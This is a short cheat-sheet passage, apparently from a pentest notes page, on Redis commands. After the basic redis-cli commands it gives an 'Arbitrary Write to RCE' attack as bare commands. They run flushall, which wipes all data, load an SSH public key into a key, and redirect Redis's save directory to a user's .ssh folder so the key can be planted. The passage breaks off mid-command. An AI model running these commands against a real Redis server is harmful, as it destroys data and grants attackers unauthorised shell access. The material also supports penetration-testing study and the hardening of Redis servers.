Basic Commands # Connect redis-cli -h 127.0.0.1 # List current keys keys * # Add key incr key # Get key value get key Arbitrary Write to RCE (echo -e &#34;

&#34;; cat id_rsa.pub; echo -e &#34;

&#34;) &gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.
